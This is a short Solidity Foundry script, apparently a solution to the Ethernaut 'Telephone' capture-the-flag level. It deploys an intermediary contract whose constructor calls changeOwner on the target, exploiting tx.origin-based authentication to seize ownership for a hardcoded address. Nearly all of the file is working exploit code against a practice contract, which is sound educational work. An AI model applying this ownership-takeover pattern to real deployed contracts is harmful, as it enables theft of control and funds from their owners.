// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Telephone} from "../src/Telephone.sol";

contract TelephoneSolve is Script{
    Telephone public telephone = Telephone(0xbB45D0C7AC29151e0309338a63a7fFEffA348585);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Original Owner : ", telephone.owner());

        Attack attack = new Attack(telephone);
        console.log("Attack Address : ", address(attack));

        console.log("New Owner : ", telephone.owner());
        vm.stopBroadcast();
    }
}

contract Attack{
    Telephone public telephone;
    constructor(Telephone _telephone){
        telephone = _telephone;
        telephone.changeOwner(0x699BceEbD59a5b52bB586C737cD7ba636f3Fe602);
    }
}